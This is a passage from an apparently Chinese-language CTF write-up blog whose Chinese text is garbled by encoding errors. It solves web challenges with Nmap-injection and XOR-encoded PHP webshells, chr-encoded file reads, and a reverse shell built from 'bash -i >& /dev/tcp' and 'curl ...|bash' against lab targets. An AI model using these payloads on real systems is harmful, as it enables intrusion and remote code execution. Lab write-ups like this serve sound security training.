id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>Nmapå‚æ•°æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><p>å’Œä¸Šé¢ä¸€é“é¢˜æ¯”è¾ƒåƒäº†ï¼Œéƒ½æ˜¯è€ƒå¯ŸNmapå‚æ•°æ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºæºç ã€‚</p><p>ç›´æ¥ç”¨Online Toolçš„payloadè¿›è¡Œæµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure><p>æç¤ºhackerï¼ŒFuzzä¹‹åå‘ç°åº”è¯¥æ˜¯è¿‡æ»¤PHPå…³é”®å­—ï¼Œæ”¹ç”¨çŸ­æ ‡ç­¾å’Œphtmlåç¼€ç»•è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; &lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰æç¤ºå…¶ä»–é»‘åå•ä¿¡æ¯ï¼Œè®¿é—®å½“å‰ç›®å½•ä¸‹çš„<code>hack.phtml</code>æ–‡ä»¶å­˜åœ¨ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flagã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/145906109">https://zhuanlan.zhihu.com/p/145906109</a></p></blockquote><h2 id="RoarCTF2019-Easy-Calc">RoarCTF2019 Easy Calc</h2><h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3><ul><li>ä»£ç å®¡è®¡</li><li>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassï¼š<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></li></ul><h3 id="è§£é¢˜-v3">è§£é¢˜</h3><p>æŸ¥çœ‹æºä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">//å¯¹è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒURLç¼–ç å¹¶ä»¥GETæ–¹å¼è®¿é—®è¯·æ±‚</span></span><br><span class="line">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),      </span><br><span class="line">            type:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>calc.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬13è¡Œ<code>eval</code>å¯ä»¥æ‰§è¡ŒPHPä»£ç ï¼Œæµ‹è¯•å‘ç°<code>num</code>å‚æ•°ä¸èƒ½è¾“å…¥éæ•°å­—çš„å€¼ï¼Œå¦åˆ™ä¼šç›´æ¥500ã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><blockquote><p>ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ã€‚</p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619120244.png" alt=""></p><p>ä»£ç ä¸­è¿‡æ»¤äº†<code>/</code>ï¼Œç”¨<code>chr</code>ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619122312.png" alt=""></p><p>è¯»å–<code>/f1agg</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><h2 id="watevrCTF-2019-Supercalc">watevrCTF-2019 Supercalc</h2><h3 id="TODO-v3">TODO</h3><h2 id="RCTF2019-calcalcalc">RCTF2019 calcalcalc</h2><h3 id="TODO-v4">TODO</h3><h2 id="De1CTF-2019-9calc">De1CTF 2019 9calc</h2><h3 id="TODO-v5">TODO</h3><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ">GXYCTF2019 ç¦æ­¢å¥—å¨ƒ</h2><h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3><ul><li>Gitæºç æ³„éœ²</li><li>æ— å‚æ•°webshell</li></ul><h3 id="è§£é¢˜-v4">è§£é¢˜</h3><p>dirmapæ‰«æå‘ç°æœ‰Gitç›®å½•ï¼Œç”¨GitHack downloadä¸‹æ¥ï¼Œå®¡è®¡ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼<code>/[a-z,_]+\((?R)?\)/</code>å¾ˆæ˜æ˜¾æ˜¯æ— å‚æ•°webshellï¼Œç›´æ¥ä¸ŠpayloadæŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;var_dump(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702000024.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p>array_rand()    å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br>array_flip()    array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</p></blockquote><p>å½“ç„¶ï¼Œè¿˜å¯ä»¥å†™headerå­—æ®µï¼Œç„¶åç”¨get_all_header()å‡½æ•°è·å¾—<code>flag.php</code>æ–‡ä»¶ã€‚</p><h2 id="BJDCTF-2nd-duangShell">BJDCTF 2nd duangShell</h2><h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3><ul><li>swpæ–‡ä»¶æ³„éœ²</li><li>åå¼¹shell</li></ul><h3 id="è§£é¢˜-v5">è§£é¢˜</h3><p>æ‰“å¼€é¢˜ç›®æç¤ºswpæ–‡ä»¶æ³„éœ²ï¼Œè®¿é—®<code>.index.php.swp</code>ä¸‹è½½æ–‡ä»¶ï¼Œ<code>vim -r index.php.swp</code>æ¢å¤æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿæºä»£ç ä¹‹åå‘ç°æ˜¯ç»•è¿‡è¿‡æ»¤ä¹‹åå‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®ã€‚</p><p>å› ä¸ºè¿‡æ»¤äº†$ç¬¦å·ï¼Œæ‰€ä»¥ä¸èƒ½é‡‡ç”¨è¿™ç§é»‘åå•æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;ca;b&#x3D;t;c&#x3D;flag;&#96;&#96;$ab&#96; &#96;$c</span><br></pre></td></tr></table></figure><p>ç¦ç”¨äº†base64ä¹‹åä¸èƒ½ä½¿ç”¨base64ç¼–ç ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot; | base64 -d</span><br></pre></td></tr></table></figure><p>è€Œä¸”exec()å‡½æ•°æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œåˆæƒ³äº†ä¸€äº›å¥‡æ€ªçš„å§¿åŠ¿ï¼Œç€å®ä¸è¡Œï¼Œçœ‹å¸ˆå‚…ä»¬çš„åšå®¢å§ã€‚</p><p>è¿™é“é¢˜ç”¨åˆ°çš„æ˜¯åå¼¹shellï¼Œå…ˆç”¨å°å·å¼€ä¸€ä¸ªLinuxé¶æœºï¼Œç”¨SSHç™»å½•ä¸Šå»ï¼ŒæŸ¥çœ‹ipåœ°å€ã€‚</p><p>åœ¨<code>/var/www/html/re_shell.txt</code>å†™å…¥åå¼¹shellå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>å†ç›‘å¬æœ¬åœ°çš„å¯¹åº”ç«¯å£ï¼Œåœ¨é¶æœºä¸Šè®¿é—®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend&#x3D;curl http:&#x2F;&#x2F;[ip]&#x2F;[æ–‡ä»¶å]|bash</span><br></pre></td></tr></table></figure><p>æœ¬æœºè·å¾—shellåï¼ŒæŸ¥æ‰¾flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name *flag*</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-RCE-ME">æå®¢å¤§æŒ‘æˆ˜2019 RCE ME</h2><h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3><ul><li>æ— æ•°å­—å­—æ¯çš„webshell</li><li>disable_functionç»•è¿‡</li></ul><h3 id="è§£é¢˜-v6">è§£é¢˜</h3><p>å®¡è®¡ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçŸ¥è¯†ç‚¹éƒ½è¦è€ƒçƒ‚äº†ï¼Œå…ˆç”¨phpinfoéªŒè¯ä¸€ä¸‹ï¼Œç›´æ¥ç»™payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706133157.png" alt=""></p><p>å…ˆæ„é€ ä¸€ä¸ªshellï¼Œç”¨èšå‰‘è¿æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[_]($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure><blockquote><p>PHP7.0 è¿˜å¯ä»¥ä½¿ç”¨assertæ¥æ‰§è¡Œphpè¯­å¥ï¼ŒPHP7.1ä¹‹åå°±ä¸è¡Œäº†ã€‚</p></blockquote><p>ç„¶åå†åŠ è½½<a href="https://github.com/Medicean/as_bypass_php_disable_functions">ç»•è¿‡disable_functionçš„æ’ä»¶</a>ï¼Œè¿è¡Œreadflagå³å¯ã€‚</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706135436.png" style="zoom:67%;" /><h2 id="WUSTCTF2020-æœ´å®æ— å">WUSTCTF2020 æœ´å®æ— å</h2><h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3><ul><li>intvalå‡½æ•°ç»•è¿‡</li><li>md5å¼±ç±»å‹</li><li>Linuxå‘½ä»¤ç©ºæ ¼å’Œcatç»•è¿‡</li></ul><h3 id="è§£é¢˜-v7">è§£é¢˜</h3><p>æ ¹æ®hintè®¿é—®<code>fl4g.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 